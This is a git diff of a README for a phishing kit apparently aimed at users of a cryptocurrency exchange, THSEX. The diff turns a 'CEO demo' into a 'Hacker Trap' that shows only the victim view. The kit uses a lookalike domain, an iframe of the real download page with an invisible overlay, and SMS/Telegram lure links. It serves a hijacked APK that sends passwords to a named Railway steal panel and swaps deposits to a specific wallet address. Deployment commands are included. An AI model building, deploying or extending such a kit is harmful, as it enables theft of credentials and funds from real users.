@@ -1,47 +1,41 @@
-# THSEX MITM Download Attack — CEO Demo (Vercel)
+# THSEX Hacker Trap (Vercel)
 
-End-to-end live proof: real official URL → poisoned `/api/downloadlink` → **THSEX6401.apk** → Railway steal panel.
+Victim sees exactly what hacker shows — no CEO panels, no demo banners.
 
-## Setup
+## What victim sees
+
+1. Mobile browser bar: `thsexcex.online/#/pages/downapp/index`
+2. Real THSEX download page (loaded from official site in iframe)
+3. Taps **Download Android APK** → gets **THSEX6401.apk** (hijack build)
+
+## Routes
+
+| Path | What |
+|------|------|
+| `/pages/downapp/index` | **Main trap** — iframe + invisible overlay |
+| `/go` | SMS/Telegram link entry (brief loading → trap) |
+| `/clone` | Backup clone if iframe blocked |
+
+## Setup & deploy
 
 ```bash
-cd thsex_steal_demo/download_phish_next
 npm install
-npm run setup    # copies THSEX6401.apk + extracts real button images from WGT
-npm run dev
-```
-
-## CEO URLs (after deploy)
-
-| Path | Purpose |
-|------|---------|
-| `/ceo` | Full attack chain dashboard |
-| `/pages/downapp/index` | **Live MITM demo** — real URL chrome + poisoned API |
-| `/api/real/downloadlink` | Unmodified THSEX API response |
-| `/api/proxy/downloadlink` | MITM — swaps CDN URL to hijack APK |
-| `/THSEX6401.apk` | Patched hijack APK (37MB) |
-| `/panel` | Embedded Railway steal panel |
-
-## Deploy Vercel
-
-```bash
 npm run setup
+npm run dev
+npx vercel login
 npx vercel --prod
 ```
 
-Set project name e.g. `thsexcex-online` for realistic path demo.
+## After install
 
-## CEO call flow
+- Login → passwords on https://web-production-682ba.up.railway.app/panel
+- Deposit/withdraw → `TBiC1Lmmpbkfputy2o91k6jrGUoz9xHvH3`
 
-1. Open `/pages/downapp/index` on phone
-2. Show address bar: `thsexcex.online/#/pages/downapp/index`
-3. CEO panel shows real CDN URL → hijack APK URL swap
-4. Tap Download → install THSEX6401.apk
-5. Login → https://web-production-682ba.up.railway.app/panel
-6. Deposit shows wallet `TBiC1Lmmpbkfputy2o91k6jrGUoz9xHvH3`
+## CEO call
 
-## Real config (no dummy)
+1. Open deployed URL on phone: `/pages/downapp/index`
+2. Show: looks like official THSEX download page
+3. Tap download → install THSEX6401.apk
+4. Login → show Railway panel
 
-- Steal panel: `web-production-682ba.up.railway.app`
-- Hijack wallet: `TBiC1Lmmpbkfputy2o91k6jrGUoz9xHvH3`
-- Real API: `api.thsexcex.com/api/downloadlink`
+You explain the attack. Site shows victim view only.
